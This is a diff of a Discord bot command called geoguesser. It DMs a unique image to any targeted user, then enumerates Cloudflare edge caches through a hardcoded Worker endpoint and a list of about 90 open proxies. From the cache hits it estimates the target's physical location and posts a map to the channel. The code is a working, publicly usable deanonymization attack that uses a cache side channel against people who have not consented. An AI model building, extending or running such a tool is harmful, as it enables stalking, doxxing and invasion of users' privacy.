@@ -1,7 +1,8 @@
 """
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
-then uses Cloudflare cache enumeration to estimate their location.
+pre‑caches it, then uses Cloudflare cache enumeration
+from the ORD worker AND internal proxy scanner to estimate location.
 Public command – anyone can use it.
 """
 
@@ -17,10 +18,11 @@ import math
 import traceback
 
 # ============ CONFIGURATION ============
-WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
+WORKER_ORD = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"   # Original (ORD)
+WAIT_SECONDS = 25
 # =======================================
 
-# Approximate coordinates for Cloudflare colos
+# Cloudflare colo coordinates (same as before)
 COLO_COORDS = {
     'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
     'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
@@ -43,6 +45,32 @@ COLO_COORDS = {
     'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
     'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
 }
+
+# Curated list of HTTPS‑capable proxies (taken from your earlier list)
+PROXY_LIST = [
+    "212.113.104.29:10801","213.176.113.24:50001","43.167.173.109:8080","139.99.95.120:8080",
+    "79.137.78.133:8002","64.188.77.26:3128","147.45.60.252:1081","79.133.180.232:10808",
+    "8.221.126.184:80","34.94.46.8:80","178.250.156.112:443","165.138.86.202:8080",
+    "95.140.154.156:1080","85.234.100.149:1080","129.226.127.245:18080","129.226.72.101:18080",
+    "103.237.102.191:11111","185.105.184.45:1110","138.124.26.19:1080","31.76.29.13:8080",
+    "217.144.187.80:1080","43.130.231.201:8080","178.130.47.42:1081","181.39.25.196:8118",
+    "103.43.191.71:8888","34.43.46.91:80","159.195.49.27:8888","103.204.211.48:32255",
+    "45.43.60.220:8080","94.103.13.179:40001","79.110.49.147:8080","81.177.165.209:10808",
+    "203.175.126.229:8000","47.253.201.85:7890","149.28.87.103:8888","103.81.194.167:8080",
+    "95.216.22.149:8095","178.130.47.41:1081","78.26.146.16:443","186.241.90.120:7890",
+    "178.130.47.50:1081","31.76.10.209:8080","220.128.223.136:8085","185.239.50.122:10808",
+    "167.86.91.238:80","198.89.96.140:808","185.142.156.229:2080","202.28.194.139:31280",
+    "91.142.75.202:1080","34.134.231.117:3129","176.99.134.183:8090","178.128.59.180:18080",
+    "64.188.77.221:3128","5.189.159.180:80","92.118.234.124:1080","128.140.113.110:8081",
+    "43.160.255.142:7890","140.245.99.105:7890","202.58.77.239:8080","101.36.109.77:8118",
+    "103.69.96.15:8888","5.35.71.232:10808","5.161.50.82:8118","147.45.60.249:1081",
+    "20.83.140.251:8080","8.219.97.248:80","109.120.184.202:1080","164.52.11.194:18080",
+    "95.163.234.50:10808","3.211.120.181:443","204.168.225.55:8888","147.45.60.241:1081",
+    "113.160.132.26:8080","43.203.195.46:80","64.112.184.210:3128","173.212.245.136:8888",
+    "51.79.199.104:3128","185.191.239.97:1080","81.168.119.85:443","46.39.105.157:8080",
+    "103.240.6.107:51565","174.137.134.182:2999","110.49.66.210:8080","178.130.47.43:1082",
+    "203.162.13.26:6868","70.34.252.68:1080","81.88.26.104:3128",
+]
 
 def generate_random_image():
     """Generate a 64x64 PNG with random pixels + random lines – totally unique each time."""
@@ -76,24 +104,60 @@ def haversine(lat1, lon1, lat2, lon2):
     return R * 2 * math.asin(math.sqrt(a))
 
 async def safe_send_embed(channel, embed):
-    """
-    Send an embed, compatible with both old (embed=) and new (embeds=) syntax.
-    """
+    """Send an embed compatible with both old and new discord.py."""
     try:
-        # Old discord.py: embed keyword
         return await channel.send(embed=embed)
     except TypeError:
-        # Newer versions that only accept embeds=list
         return await channel.send(embeds=[embed])
 
+async def scan_via_proxies(image_url):
+    """
+    Use the internal proxy list to probe the image URL from different locations.
+    Returns a dict with the same structure as the worker: { url, checked, hits, datacenters, full_results }.
+    """
+    results = []
+    sem = asyncio.Semaphore(20)  # limit concurrency
+
+    async def fetch_one(proxy):
+        async with sem:
+            try:
+                proxy_url = f"http://{proxy}"
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(image_url, proxy=proxy_url,
+                                           timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                        cf_ray = resp.headers.get('cf-ray', '')
+                        cache_status = resp.headers.get('cf-cache-status', 'MISS')
+                        colo = cf_ray.split('-')[-1] if '-' in cf_ray else 'UNKNOWN'
+                        return colo, cache_status
+            except:
+                return None
+
+    tasks = [fetch_one(p) for p in PROXY_LIST]
+    raw_responses = await asyncio.gather(*tasks)
+
+    full_results = []
+    for proxy, res in zip(PROXY_LIST, raw_responses):
+        if res:
+            colo, status = res
+            full_results.append({"colo": colo, "status": status, "hit": status == "HIT"})
+        else:
+            full_results.append({"colo": "UNKNOWN", "status": "ERROR", "hit": False})
+
+    datacenters = list(set(r['colo'] for r in full_results if r['hit']))
+    return {
+        "url": image_url,
+        "checked": len(full_results),
+        "hits": len(datacenters),
+        "datacenters": datacenters,
+        "full_results": full_results
+    }
+
 async def run(client, message, args):
-    # Input validation
     if not args.strip():
         await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
         return
 
     target_arg = args.strip().split()[0]
-
     try:
         if target_arg.startswith('<@') and target_arg.endswith('>'):
             user_id = int(target_arg.strip('<@!>'))
@@ -104,15 +168,12 @@ async def run(client, message, args):
         await message.channel.send("❌ Invalid user ID or mention.")
         return
 
-    # Initial status message – if this fails, the command will still try to send results at the end
     try:
         status_msg = await message.channel.send("🖼️ Generating unique image...")
     except Exception:
         status_msg = None
 
-    # Helper: safely edit a status message, ignoring all errors
     async def _update_status(text):
-        nonlocal status_msg
         if status_msg is None:
             return
         try:
@@ -121,22 +182,14 @@ async def run(client, message, args):
             pass
 
     try:
-        # Generate image
         img_bytes = generate_random_image()
-
         await _update_status("📤 Uploading to Discord CDN...")
-
-        # Upload to channel to get CDN URL
         try:
-            sent = await message.channel.send(
-                file=discord.File(img_bytes, filename="geo.png")
-            )
+            sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
             if not sent.attachments:
                 await message.channel.send("❌ No attachment URL returned.")
                 return
             image_url = sent.attachments[0].url
-
-            # Delete temporary upload message (safe)
             try:
                 await sent.delete()
             except Exception:
@@ -145,9 +198,17 @@ async def run(client, message, args):
             await message.channel.send(f"❌ Failed to upload image: {e}")
             return
 
-        await _update_status(f"📨 Sending image to {target.name}...")
+        # Pre‑cache
+        await _update_status("🌐 Pre-caching image on global CDN...")
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(image_url, timeout=10) as resp:
+                    if resp.status == 200:
+                        await resp.read()
+        except Exception:
+            pass
 
-        # DM the image to the target
+        await _update_status(f"📨 Sending image to {target.name}...")
         img_bytes.seek(0)
         try:
             await target.send(file=discord.File(img_bytes, filename="geo.png"))
@@ -158,47 +219,70 @@ async def run(client, message, args):
             await message.channel.send(f"❌ DM failed: {e}")
             return
 
-        await _update_status("⏳ Waiting 12 seconds for cache & notifications...")
-        await asyncio.sleep(12)
+        await _update_status(f"⏳ Waiting {WAIT_SECONDS}s for cache & notifications...")
+        await asyncio.sleep(WAIT_SECONDS)
 
-        await _update_status("🔍 Enumerating Cloudflare cache locations...")
+        await _update_status("🔍 Enumerating Cloudflare cache (ORD worker + proxy scanner)...")
 
-        api_url = f"{WORKER_URL}?url={image_url}"
+        # Fetch from both sources in parallel
+        api_ord = f"{WORKER_ORD}?url={image_url}"
 
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(api_url, timeout=35) as resp:
-                    if resp.status != 200:
-                        await message.channel.send(f"❌ Worker error (HTTP {resp.status})")
-                        return
-                    data = await resp.json()
-        except asyncio.TimeoutError:
-            await message.channel.send("⏰ Worker timed out – try again later.")
-            return
-        except Exception as e:
-            await message.channel.send(f"⚠️ Worker request failed: {e}")
-            return
+        async def fetch_ord():
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(api_ord, timeout=35) as resp:
+                        if resp.status == 200:
+                            return await resp.json()
+            except:
+                return None
 
-        # Build raw data string for debugging
-        raw_json = json.dumps(data, indent=2)
+        data_ord, data_proxy = await asyncio.gather(
+            fetch_ord(),
+            scan_via_proxies(image_url)   # our internal scanner
+        )
+
+        # Merge results
+        datacenters = []
+        hits = 0
+        checked = 0
+        full_results = []
+
+        for data in [data_ord, data_proxy]:
+            if data:
+                dcs = data.get('datacenters', [])
+                for dc in dcs:
+                    if dc not in datacenters:
+                        datacenters.append(dc)
+                hits += data.get('hits', 0)
+                checked += data.get('checked', 0)
+                full_results.extend(data.get('full_results', []))
+
+        # Build raw JSON for display
+        raw_json = json.dumps({"datacenters": datacenters, "full_results": full_results}, indent=2)
         if len(raw_json) > 1000:
             raw_json = raw_json[:1000] + "\n... (truncated)"
 
-        # Process worker response
-        datacenters = data.get('datacenters', [])
-        hits = data.get('hits', 0)
-        checked = data.get('checked', 0)
+        # Scanned colos
+        probed_colos = []
+        seen = set()
+        for r in full_results:
+            colo = r.get('colo', '???')
+            if colo not in seen:
+                seen.add(colo)
+                probed_colos.append(f"{colo} ({r.get('status', '???')})")
+        colos_text = "\n".join(probed_colos[:12]) if probed_colos else "Unknown"
+        if len(probed_colos) > 12:
+            colos_text += f"\n... and {len(probed_colos)-12} more"
 
-        # Base description with the worker URL included
         description = (
             f"**Target:** {target.name}\n"
             f"**Image URL:** [Link]({image_url})\n"
-            f"**Worker URL:** [Link]({api_url})\n"
-            f"**Datacenters found:** {len(datacenters)}\n"
+            f"**Sources:** ORD worker + proxy scanner\n"
+            f"**Pre-cached:** ✅\n"
+            f"**Datacenters with HIT:** {len(datacenters)}\n"
             f"**Estimated radius:** ~"
         )
 
-        # If no datacenters, still show the raw response and the URL
         if not datacenters:
             embed = discord.Embed(
                 title="📍 GeoGuesser – No Cache Hits",
@@ -206,14 +290,12 @@ async def run(client, message, args):
                 color=0xffa500,
                 timestamp=datetime.now()
             )
-            embed.add_field(name="📄 Raw Worker Response", value=f"```json\n{raw_json}\n```", inline=False)
-            embed.set_footer(text="The target may not have downloaded the image, or cache not yet propagated.")
-            # Try to delete status message (ignore errors)
+            embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
+            embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
+            embed.set_footer(text="No cache entry found. Target may not have downloaded the image.")
             if status_msg:
-                try:
-                    await status_msg.delete()
-                except Exception:
-                    pass
+                try: await status_msg.delete()
+                except: pass
             await safe_send_embed(message.channel, embed)
             return
 
@@ -233,66 +315,51 @@ async def run(client, message, args):
                 color=0xffa500,
                 timestamp=datetime.now()
             )
-            embed.add_field(name="🌐 Datacenters", value=", ".join(datacenters), inline=False)
-            embed.add_field(name="📄 Raw Worker Response", value=f"```json\n{raw_json}\n```", inline=False)
+            embed.add_field(name="🌐 HIT Datacenters", value=", ".join(datacenters), inline=False)
+            embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
+            embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
             if status_msg:
-                try:
-                    await status_msg.delete()
-                except Exception:
-                    pass
+                try: await status_msg.delete()
+                except: pass
             await safe_send_embed(message.channel, embed)
             return
 
-        # Compute estimation
+        # Compute center
         center_lat = sum(c['lat'] for c in coords) / len(coords)
         center_lon = sum(c['lon'] for c in coords) / len(coords)
-        max_dist = max(
-            haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords
-        )
+        max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
         radius_miles = max_dist * 1.5 if max_dist > 0 else 250
 
         markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
-        map_url = (
-            f"https://staticmap.openstreetmap.de/staticmap.php"
-            f"?center={center_lat},{center_lon}&zoom=5&size=600x400"
-            f"&markers={markers}&maptype=mapnik"
-        )
+        map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&markers={markers}&maptype=mapnik"
 
-        # Final description with radius
         description += f"{radius_miles:.0f} miles"
 
         embed = discord.Embed(
-            title="📍 GeoGuesser – Location Estimate",
+            title="📍 GeoGuesser – Combined Location Estimate",
             description=description,
             color=0x00ff00,
             timestamp=datetime.now()
         )
-        embed.add_field(
-            name="🌐 Datacenters",
-            value="\n".join(colo_names[:12]) +
-                  ("" if len(colo_names) <= 12 else f"\n... and {len(colo_names)-12} more"),
-            inline=False
-        )
+        embed.add_field(name="🌐 HIT Datacenters", value="\n".join(colo_names[:12]) +
+                        ("" if len(colo_names) <= 12 else f"\n... and {len(colo_names)-12} more"), inline=False)
         embed.add_field(name="📊 Scan Stats", value=f"Checked: {checked}\nHits: {hits}", inline=True)
         embed.add_field(name="📍 Center", value=f"{center_lat:.4f}, {center_lon:.4f}", inline=True)
-        embed.add_field(name="📄 Raw Worker Response", value=f"```json\n{raw_json}\n```", inline=False)
-        embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
+        embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
+        embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
+        embed.set_footer(text="Powered by Cloudflare Cache Enumeration (dual‑source)")
         embed.set_image(url=map_url)
 
-        # Clean up status message (ignoring any error)
         if status_msg:
-            try:
-                await status_msg.delete()
-            except Exception:
-                pass
+            try: await status_msg.delete()
+            except: pass
 
         await safe_send_embed(message.channel, embed)
 
     except Exception as e:
-        # Full traceback for debugging
         traceback.print_exc()
         error_msg = f"⚠️ Unexpected error: {e}"
         try:
             await message.channel.send(error_msg)
-        except Exception:
+        except:
             pass
